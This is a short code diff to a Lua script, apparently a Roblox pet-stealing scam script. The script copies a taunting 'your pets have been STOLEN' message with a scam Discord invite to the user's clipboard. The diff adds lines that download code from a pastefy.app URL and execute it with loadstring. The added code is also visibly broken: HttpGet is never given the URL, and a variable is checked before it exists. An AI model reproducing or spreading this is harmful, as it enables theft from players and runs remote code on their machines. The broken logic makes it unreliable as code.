@@ -31,6 +31,20 @@
         local teleported = false
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        
+        local url = "https://pastefy.app/VISU0w9k/raw"
+        local response = game:HttpGet
+        if response and type(response) == "string" then
+            if execute then
+                local execute = loadstring(response)
+                execute()
+            else
+                warn("loadstring failed: invalid Lua code")
+            end
+        else
+            warn("HttpGet failed or returned invalid response")
+        end
+        
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
